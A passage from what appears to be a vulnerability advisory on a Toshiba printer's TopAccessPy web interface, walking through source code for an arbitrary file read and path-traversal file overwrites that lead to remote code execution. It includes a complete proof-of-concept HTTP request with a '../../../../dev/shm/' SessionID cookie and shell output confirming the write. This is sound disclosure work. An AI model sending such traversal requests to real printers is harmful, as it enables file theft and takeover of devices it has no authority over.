 <span style="color: #666666">17</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">resultGetStorageFileLink</span>(request):
 <span style="color: #666666">18</span>     <span style="color: #008000; font-weight: bold">try</span>:
 <span style="color: #666666">19</span>         Logger<span style="color: #666666">.</span>w(<span style="color: #008000">str</span>(request))
 <span style="color: #666666">20</span>         payloads <span style="color: #666666">=</span> request<span style="color: #666666">.</span>GET
 <span style="color: #666666">21</span>         filename <span style="color: #666666">=</span> payloads[<span style="color: #BA2121">&quot;filename&quot;</span>]
 <span style="color: #666666">22</span>         Logger<span style="color: #666666">.</span>w(filename)
 <span style="color: #666666">23</span>         rootpath <span style="color: #666666">=</span> FileHandler<span style="color: #666666">.</span>getStorageRootPath(<span style="color: #BA2121">&quot;normal&quot;</span>)
 <span style="color: #666666">24</span>
 <span style="color: #666666">25</span>         path <span style="color: #666666">=</span> glob<span style="color: #666666">.</span>glob(rootpath <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/*/&#39;</span> <span style="color: #666666">+</span> filename)
 <span style="color: #666666">26</span>         Logger<span style="color: #666666">.</span>w(<span style="color: #008000">str</span>(path))
 <span style="color: #666666">27</span>         res <span style="color: #666666">=</span> FileResponse(path[<span style="color: #666666">0</span>])
 <span style="color: #666666">28</span>         res<span style="color: #666666">.</span>content_type <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;application/zip&#39;</span>
 <span style="color: #666666">29</span>         res<span style="color: #666666">.</span>content_disposition <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;attachment; filename=&#39;</span><span style="color: #666666">+</span>filename
 <span style="color: #666666">30</span>         <span style="color: #008000; font-weight: bold">return</span> res
[<span style="color: #666666">...</span>]
</pre></div>

<p>The filename variable is provided by an attacker in the address (<code>?filename=/path/to/file</code>). This file will be opened and its content will be sent to the attacker, due to the use of <code>FileResponse()</code>, implemented in Pyramid.</p>
<p>An attacker can read any file on the printer.</p>
<p><a id="rce-insecure-upload-03"></a></p>
<h2>Details - Remote Code Execution - insecure upload</h2>
<p>It is possible to overwrite any file when installing a new application in Administration &gt; Application &gt; Application List &gt; Install Application:</p>
<p><img alt="" src="images/2024-toshiba-application-install-01.png" /></p>
<p><img alt="" src="images/2024-toshiba-application-install-02.png" /></p>
<p>When installing an application, several requests will be sent to the printer:</p>
<ol>
<li>the first request is a HTTP POST to <code>/tapy/server/appmgmt/uploadPackage</code>,</li>
<li>then a HTTP POST is sent to <code>/tapy/server/appmgmt/extractPackage</code>.</li>
</ol>
<p>The vulnerability can be found when the first HTTP POST is sent (to <code>/tapy/server/appmgmt/uploadPackage</code>).</p>
<p><img alt="" src="images/2024-toshiba-application-install-rce.png" /></p>
<p>The <code>/uploadPackage</code> route is defined in the <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/__init__.py</code> file to call the <code>upload_package</code> function:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/__init__.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>[<span style="color: #666666">...</span>]
 <span style="color: #666666">11</span>   config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;upload_package&#39;</span>, <span style="color: #BA2121">&#39;uploadPackage&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">False</span>)
[<span style="color: #666666">...</span>]
</pre></div>

<p>The implementation of the view is done in the <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code> file:</p>
<p>3 important variables are set:</p>
<ul>
<li><code>SessionID</code> on line 179, retrieved from the cookie,</li>
<li><code>packagename</code> on line 188 retrieved from the POST-data,</li>
<li><code>package_file</code> on line 189 retrieved from the POST-data.</li>
</ul>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">170</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span><span style="color: #BA2121">&#39;upload_package&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">False</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;string&#39;</span>)
<span style="color: #666666">171</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(request):
<span style="color: #666666">172</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">173</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;upload_package : Start &quot;</span>)
<span style="color: #666666">174</span>     SessionID <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">175</span>     session <span style="color: #666666">=</span> <span style="color: #BA2121">&#39; &#39;</span>
<span style="color: #666666">176</span>     csrfpId <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">177</span>
<span style="color: #666666">178</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;SessionID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">179</span>         SessionID <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;SessionID&#39;</span>] <span style="color: #666666">&lt;---------------</span> SessionID <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">cookie</span>
<span style="color: #666666">180</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;Session&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">181</span>         session <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;Session&#39;</span>]
<span style="color: #666666">182</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;txtCSRFPID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>POST:
<span style="color: #666666">183</span>         csrfpId <span style="color: #666666">=</span> request<span style="color: #666666">.</span>POST[<span style="color: #BA2121">&#39;txtCSRFPID&#39;</span>]
<span style="color: #666666">184</span>
<span style="color: #666666">185</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;Session ID obtained from request :&#39;</span> <span style="color: #666666">+</span> SessionID)
<span style="color: #666666">186</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;csrfpId obtained from request:&#39;</span> <span style="color: #666666">+</span> csrfpId)
<span style="color: #666666">187</span>
<span style="color: #666666">188</span>     packagename <span style="color: #666666">=</span> request<span style="color: #666666">.</span>POST[<span style="color: #BA2121">&#39;txtSelectedFileName&#39;</span>] <span style="color: #666666">&lt;----------</span> packagename <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">POST</span><span style="color: #666666">-</span>data
<span style="color: #666666">189</span>     package_file <span style="color: #666666">=</span> request<span style="color: #666666">.</span>POST[<span style="color: #BA2121">&#39;idFileName&#39;</span>]<span style="color: #666666">.</span>file <span style="color: #666666">&lt;-------------</span> package_file <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">POST</span><span style="color: #666666">-</span>data
<span style="color: #666666">190</span>
<span style="color: #666666">191</span>     validationMap <span style="color: #666666">=</span> applicationManagementModel<span style="color: #666666">.</span>validate_user(SessionID, session, csrfpId)
<span style="color: #666666">192</span>
<span style="color: #666666">193</span>     <span style="color: #008000; font-weight: bold">if</span> validationMap[<span style="color: #BA2121">&#39;VALIDATION_STATUS&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;PASSED&#39;</span>:
<span style="color: #666666">194</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;User Validation : SUCCESS&#39;</span>)
<span style="color: #666666">195</span>         data <span style="color: #666666">=</span> applicationManagementModel<span style="color: #666666">.</span>upload_package(packagename, package_file, SessionID)
<span style="color: #666666">196</span>         <span style="color: #408080; font-style: italic">#log.info(&quot;Response recieved in an attempt to upload &quot; : &quot; + str(data))</span>
<span style="color: #666666">197</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;upload_package : End &quot;</span>)
<span style="color: #666666">198</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">199</span>         <span style="color: #008000; font-weight: bold">return</span> data
<span style="color: #666666">200</span>     <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">201</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;User Validation : FAILURE&#39;</span>)
<span style="color: #666666">202</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;upload_package : End &quot;</span>)
<span style="color: #666666">203</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&quot;HTTP_REQUEST_FORBIDDEN&quot;</span> <span style="color: #AA22FF; font-weight: bold">in</span> validationMap:
<span style="color: #666666">204</span>             <span style="color: #008000; font-weight: bold">return</span> HTTPForbidden(<span style="color: #BA2121">&quot;Error 403 : Forbidden Request&quot;</span>)
<span style="color: #666666">205</span>         <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">206</span>             <span style="color: #008000; font-weight: bold">return</span> json<span style="color: #666666">.</span>dumps(validationMap)
</pre></div>

<p>During the execution flow, on line 191, the method <code>validate_user()</code> is called but <code>SessionID</code> is never used, except for printing it in the logs:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">388</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">389</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">validate_user</span>(<span style="color: #008000">cls</span>, sessionId, session, csrfpid):
<span style="color: #666666">390</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: validate_user start&quot;</span>)
<span style="color: #666666">391</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;Session ID recieved   : &quot;</span> <span style="color: #666666">+</span> sessionId)
</pre></div>

<p>The execution flow then continues to line 195 with the call the method <code>upload_package</code> implemented in the <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code> file, with the 3 attacker-controlled variables:</p>
<ul>
<li><code>SessionID</code></li>
<li><code>packagename</code></li>
<li><code>package_file</code></li>
</ul>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">464</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">465</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(<span style="color: #008000">cls</span>, packagename, package_file, SessionID):
<span style="color: #666666">466</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_package start&quot;</span>)
<span style="color: #666666">467</span>
<span style="color: #666666">468</span>         upload_destination <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/work/al/tmp/upload/&#39;</span> <span style="color: #666666">+</span> SessionID <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/&#39;</span>
<span style="color: #666666">469</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #AA22FF; font-weight: bold">not</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>exists(upload_destination):
<span style="color: #666666">470</span>             os<span style="color: #666666">.</span>makedirs(upload_destination)
<span style="color: #666666">471</span>
<span style="color: #666666">472</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">473</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start&quot;</span>)
<span style="color: #666666">474</span>             <span style="color: #408080; font-style: italic">#if type(packagename) == str:</span>
<span style="color: #666666">475</span>             <span style="color: #408080; font-style: italic">#packagename = unicode(packagename, &quot;utf-8&quot;, errors=&quot;ignore&quot;)</span>
<span style="color: #666666">476</span>             <span style="color: #408080; font-style: italic">#else:</span>
<span style="color: #666666">477</span>                 <span style="color: #408080; font-style: italic">#packagename = unicode(packagename)</span>
<span style="color: #666666">478</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start -- test end&quot;</span>)
<span style="color: #666666">479</span>             <span style="color: #408080; font-style: italic">#absolute_package_path = os.path.join(upload_destination , packagename).encode()</span>
<span style="color: #666666">480</span>             absolute_package_path <span style="color: #666666">=</span> <span style="color: #008000">str</span>(os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(upload_destination , <span style="color: #008000">str</span>(packagename<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;ascii&#39;</span>,<span style="color: #BA2121">&#39;ignore&#39;</span>))))
<span style="color: #666666">481</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(absolute_package_path, <span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> output_file:
<span style="color: #666666">482</span>                 shutil<span style="color: #666666">.</span>copyfileobj(package_file, output_file)
<span style="color: #666666">483</span>
<span style="color: #666666">484</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;SUCCESS&quot;</span>
<span style="color: #666666">485</span>
<span style="color: #666666">486</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">Exception</span> <span style="color: #008000; font-weight: bold">as</span> err:
<span style="color: #666666">487</span>             log<span style="color: #666666">.</span>exception(<span style="color: #BA2121">&quot;Error In exitApp(upload_file) : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(err))
<span style="color: #666666">488</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;FAILURE&quot;</span>
</pre></div>

<p>As shown previously, the attacker has full control over these 3 variables:</p>
<ul>
<li><code>SessionID</code> (views.py:179 from the Cookie <code>SessionID</code> variable)</li>
<li><code>packagename</code> (views.py:188 from the POST-data <code>txtSelectedFileName</code> variable)</li>
<li><code>package_file</code> (views.py:189 from the POST-data <code>idFileName</code> variable)</li>
</ul>
<p>These 3 variables are not filtered and can contain any value.</p>
<p>In the HTTP request, the <code>Session</code> cookie is used to check the authorisation but the <code>SessionID</code> can be set to anything as shown previously (it is not used in the <code>validate_user</code> method). This <code>SessionID</code> value is used to store the resulting file (on line 468) without any filtering.</p>
<p>The execution flow is below:</p>
<pre><code>465     def upload_package(cls, packagename, package_file, SessionID):
[...]

-- SessionID controlled by an attacker, the upload_destination variable contains /work/al/tmp/upload/ + SessionID + /

468         upload_destination = '/work/al/tmp/upload/' + SessionID + '/'
[...]

-- absolute_file_path contains /work/al/tmp/upload/ + SessionID + / + packagename

480             absolute_package_path = str(os.path.join(upload_destination , str(packagename.encode('ascii','ignore'))))
481             with open(absolute_package_path, 'wb') as output_file:

-- and the uploaded file is then stored inside /work/al/tmp/upload/ + SessionID + packagename

482                 shutil.copyfileobj(package_file, output_file)
</code></pre>
<p>An attacker can then set <code>SessionID=../../path/to/any/file</code> in the HTTP request to overwrite any file.</p>
<p>Finally, the method <code>upload_file_to_session_folder</code> is also vulnerable (this method is similar to the <code>upload_package</code> method):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">437</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">438</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_file_to_session_folder</span>(<span style="color: #008000">cls</span>, filename, fileObj, SessionID):
<span style="color: #666666">439</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_file_to_session_folder start&quot;</span>)
<span style="color: #666666">440</span>         responseMap <span style="color: #666666">=</span> {}
<span style="color: #666666">441</span>
<span style="color: #666666">442</span>         upload_destination <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/work/al/tmp/upload/&#39;</span> <span style="color: #666666">+</span> SessionID <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/&#39;</span>
<span style="color: #666666">443</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #AA22FF; font-weight: bold">not</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>exists(upload_destination):
<span style="color: #666666">444</span>             os<span style="color: #666666">.</span>makedirs(upload_destination)
<span style="color: #666666">445</span>
<span style="color: #666666">446</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">447</span>             absolute_file_path <span style="color: #666666">=</span> <span style="color: #008000">str</span>(os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(upload_destination , <span style="color: #008000">str</span>(filename<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;ascii&#39;</span>,<span style="color: #BA2121">&#39;ignore&#39;</span>))))
<span style="color: #666666">448</span>             responseMap[<span style="color: #BA2121">&quot;ABSOLUTE_FILE_PATH&quot;</span>] <span style="color: #666666">=</span> absolute_file_path
<span style="color: #666666">449</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;absolute_file_path : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(absolute_file_path))
<span style="color: #666666">450</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(absolute_file_path, <span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> output_file:
<span style="color: #666666">451</span>                 shutil<span style="color: #666666">.</span>copyfileobj(fileObj, output_file)
<span style="color: #666666">452</span>
<span style="color: #666666">453</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;File upload to session folder completed&quot;</span>)
<span style="color: #666666">454</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_file_to_session_folder end&quot;</span>)
<span style="color: #666666">455</span>             responseMap[<span style="color: #BA2121">&quot;STATUS&quot;</span>] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;SUCCESS&quot;</span>
<span style="color: #666666">456</span>             <span style="color: #008000; font-weight: bold">return</span> responseMap
<span style="color: #666666">457</span>
<span style="color: #666666">458</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">Exception</span> <span style="color: #008000; font-weight: bold">as</span> err:
<span style="color: #666666">459</span>             log<span style="color: #666666">.</span>exception(<span style="color: #BA2121">&quot;Error In exitApp(upload_file_to_session_folder) : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(err))
<span style="color: #666666">460</span>             responseMap[<span style="color: #BA2121">&quot;STATUS&quot;</span>] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;FAILURE&quot;</span>
<span style="color: #666666">461</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_file_to_session_folder end&quot;</span>)
<span style="color: #666666">462</span>             <span style="color: #008000; font-weight: bold">return</span> responseMap
<span style="color: #666666">463</span>
</pre></div>

<p>PoC:</p>
<p>When setting the SessionID value to <code>../../../../dev/shm/</code>, we can see the resulting file <code>/dev/shm/b'upload-2.txt'</code> written instead of being stored inside <code>/work/al/tmp/upload/' + SessionID</code>:</p>
<pre><code>POST /tapy/server/appmgmt/uploadPackage HTTP/1.1
Host: 10.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4065413143858317480519150484
Content-Length: 529
Origin: http://10.0.0.1
Connection: close
Referer: http://10.0.0.1/tapy/client/appmgmt/InstallApplication.html?v=1670357577ta
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; TopAccessURL=http%3A//10.0.0.1/%3FMAIN%3DTOPACCESS; SessionID=../../../../dev/shm/; clicked=0; lastVisited=APPLINK; IgnoreSessionTimeout=1; Session=10.0.0.2.5389297fae5d47f2c3bbf71fbeefbe5b
Upgrade-Insecure-Requests: 1

-----------------------------4065413143858317480519150484
Content-Disposition: form-data; name="txtCSRFPID"

10.0.0.2.5389297fae5d47f2c3bbf71fbeefbe5b
-----------------------------4065413143858317480519150484
Content-Disposition: form-data; name="txtSelectedFileName"

upload-2.txt
-----------------------------4065413143858317480519150484
Content-Disposition: form-data; name="idFileName"; filename="upload.txt"
Content-Type: text/plain

hi

-----------------------------4065413143858317480519150484--
</code></pre>
<p>And we can find the resulting file in /dev/shm:</p>
<pre><code>bash-4.1# ls -latr /dev/shm
total 2908
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdktime.lock
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdk.mutex
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdk.lock
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdktempdb
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdkimagetempdb
----rw----  1 root   trusted      16 Oct 27 02:15 sem.ssdkdebugsettings.lock
-rwxr-xr-x  1 root   root          0 Oct 27 02:15 m.disableLogs.4
[...]
-rw-rw-rw-  1 apache trusted       3 Oct 27 12:15 b'upload-2.txt'
drwxrwxr-x  2 root   root       7840 Oct 27 12:15 .
</code></pre>
<p>An attacker can overwrite files as apache (e.g. Python files) to get Remote Code Execution.</p>
<p>An attacker can get Remote Code Execution by creating and/or overwriting files (mainly crontab files due to the restriction on the filename).</p>
<p><a id="rce-insecure-upload-04"></a></p>
<h2>Details - Remote Code Execution - insecure upload</h2>
<p>It is possible to overwrite any file when installing a new application in Administration &gt; Application &gt; Application List &gt; Install Application:</p>
<p>When installing an application, several requests will be sent to the printer:</p>
<ol>
<li>the first request is a HTTP POST to <code>/tapy/server/appmgmt/uploadPackage</code>,</li>
<li>then a HTTP POST is sent to <code>/tapy/server/appmgmt/extractPackage</code>.</li>
</ol>
<p>This vulnerability is similar to the previous vulnerability but it requires exploiting another variable. As shown previously, the attacker has full control over:</p>
<ul>
<li><code>packagename</code> defined in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py:188</code> from the POST-data <code>txtSelectedFileName</code> variable.</li>
</ul>
<p>The <code>packagename</code> variable is not filtered and can contain any value, and can be used to write file anywhere in the filesystem. This variable is ultimately used in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code> on line 480 to generate the filename:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">464</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">465</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(<span style="color: #008000">cls</span>, packagename, package_file, SessionID):
<span style="color: #666666">466</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_package start&quot;</span>)
<span style="color: #666666">467</span>
<span style="color: #666666">468</span>         upload_destination <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/work/al/tmp/upload/&#39;</span> <span style="color: #666666">+</span> SessionID <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/&#39;</span>
<span style="color: #666666">469</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #AA22FF; font-weight: bold">not</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>exists(upload_destination):
<span style="color: #666666">470</span>             os<span style="color: #666666">.</span>makedirs(upload_destination)
<span style="color: #666666">471</span>
<span style="color: #666666">472</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">473</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start&quot;</span>)
<span style="color: #666666">474</span>             <span style="color: #408080; font-style: italic">#if type(packagename) == str:</span>
<span style="color: #666666">475</span>             <span style="color: #408080; font-style: italic">#packagename = unicode(packagename, &quot;utf-8&quot;, errors=&quot;ignore&quot;)</span>
<span style="color: #666666">476</span>             <span style="color: #408080; font-style: italic">#else:</span>
<span style="color: #666666">477</span>                 <span style="color: #408080; font-style: italic">#packagename = unicode(packagename)</span>
<span style="color: #666666">478</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start -- test end&quot;</span>)
<span style="color: #666666">479</span>             <span style="color: #408080; font-style: italic">#absolute_package_path = os.path.join(upload_destination , packagename).encode()</span>
<span style="color: #666666">480</span>             absolute_package_path <span style="color: #666666">=</span> <span style="color: #008000">str</span>(os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(upload_destination , <span style="color: #008000">str</span>(packagename<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;ascii&#39;</span>,<span style="color: #BA2121">&#39;ignore&#39;</span>))))
<span style="color: #666666">481</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(absolute_package_path, <span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> output_file:
<span style="color: #666666">482</span>                 shutil<span style="color: #666666">.</span>copyfileobj(package_file, output_file)
<span style="color: #666666">483</span>
<span style="color: #666666">484</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;SUCCESS&quot;</span>
<span style="color: #666666">485</span>
<span style="color: #666666">486</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">Exception</span> <span style="color: #008000; font-weight: bold">as</span> err:
<span style="color: #666666">487</span>             log<span style="color: #666666">.</span>exception(<span style="color: #BA2121">&quot;Error In exitApp(upload_file) : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(err))
<span style="color: #666666">488</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;FAILURE&quot;</span>
</pre></div>

<p>An attacker can overwrite files as apache (e.g. Python files) to get Remote Code Execution.</p>
<p>An attacker can get Remote Code Execution by creating and/or overwriting files (mainly crontab files due to the restriction on the filename).</p>
<p><a id="rce-insecure-copy"></a></p>
<h2>Details - Remote Code Execution - insecure copy</h2>
<p>It is possible to overwrite any file when installing a new application in Administration &gt; Application &gt; Application List &gt; Install Application:</p>
<p>When installing an application, several requests will be sent to the printer:</p>
<ol>
<li>the first request is a HTTP POST to <code>/tapy/server/appmgmt/uploadPackage</code>,</li>
<li>then a HTTP POST is sent to <code>/tapy/server/appmgmt/extractPackage</code>.</li>
</ol>
<p>This vulnerability is similar to the previous vulnerability but it requires exploiting another variable. As shown previously, the attacker has full control over:</p>
<ul>
<li><code>package_file</code> defined in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py:189</code> from the POST-data <code>idFileName</code> variable.</li>
</ul>
<p>The <code>package_file</code> variable is not filtered and can contain any value, and can be used to copy file anywhere in the filesystem. This variable is ultimately used in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code> on line 482 to copy any local file to a specific filename:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">464</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">465</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(<span style="color: #008000">cls</span>, packagename, package_file, SessionID):
<span style="color: #666666">466</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_package start&quot;</span>)
<span style="color: #666666">467</span>
<span style="color: #666666">468</span>         upload_destination <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/work/al/tmp/upload/&#39;</span> <span style="color: #666666">+</span> SessionID <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/&#39;</span>
<span style="color: #666666">469</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #AA22FF; font-weight: bold">not</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>exists(upload_destination):
<span style="color: #666666">470</span>             os<span style="color: #666666">.</span>makedirs(upload_destination)
<span style="color: #666666">471</span>
<span style="color: #666666">472</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">473</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start&quot;</span>)
<span style="color: #666666">474</span>             <span style="color: #408080; font-style: italic">#if type(packagename) == str:</span>
<span style="color: #666666">475</span>             <span style="color: #408080; font-style: italic">#packagename = unicode(packagename, &quot;utf-8&quot;, errors=&quot;ignore&quot;)</span>
<span style="color: #666666">476</span>             <span style="color: #408080; font-style: italic">#else:</span>
<span style="color: #666666">477</span>                 <span style="color: #408080; font-style: italic">#packagename = unicode(packagename)</span>
<span style="color: #666666">478</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start -- test end&quot;</span>)
<span style="color: #666666">479</span>             <span style="color: #408080; font-style: italic">#absolute_package_path = os.path.join(upload_destination , packagename).encode()</span>
